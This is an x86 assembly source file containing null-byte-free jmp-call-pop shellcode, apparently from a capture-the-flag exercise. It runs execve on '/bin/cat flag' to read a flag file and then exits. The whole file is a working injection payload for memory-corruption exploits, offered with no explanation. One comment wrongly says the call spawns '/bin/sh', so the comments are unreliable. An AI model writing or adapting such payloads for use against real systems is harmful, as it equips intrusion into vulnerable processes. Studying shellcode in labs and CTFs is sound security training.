#include <sys/syscall.h>

#define STRING  "/bin/catNflag"
#define STRLEN1  8
#define STRLEN2  13
#define STRLEN3  9
#define ARGV1    (STRLEN2+1)
#define ARGV2    (STRLEN2+5)
#define ENVP    (ARGV1+8)

.globl main
.type  main, @function  //Q instrunction memory payload

main:
  jmp     calladdr  // POINTER MOVE

popladdr:
  popl    %esi                    /* esi points to STRING */
  xorl    %eax,%eax               /* get a 32-bit zero value */    
  movb    %al,(STRLEN1)(%esi)      /* null-terminate our string */ 

  movl    %esi,(ARGV1)(%esi)       /* set up argv pointer to pathname */

  leal    (STRLEN3)(%esi),%eax
  movl    %eax,(ARGV2)(%esi)       /* set up argv pointer to pathname */

  xorl    %eax,%eax  
  movb    %al,(STRLEN2)(%esi)      /* null-terminate our string */ 
  movl    %eax,(ENVP)(%esi)       /* set up null envp */   
  
  movb    $SYS_execve,%al         /* syscall number */
  movl    %esi,%ebx               /* arg 1: string pathname */
  leal    ARGV1(%esi),%ecx        /* arg 2: argv */
  leal    ENVP(%esi),%edx         /* arg 3: envp */
  int     $0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */
  
  xorl    %ebx,%ebx               /* arg 1: 0 */
  movl    %ebx,%eax
  inc     %eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int     $0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING
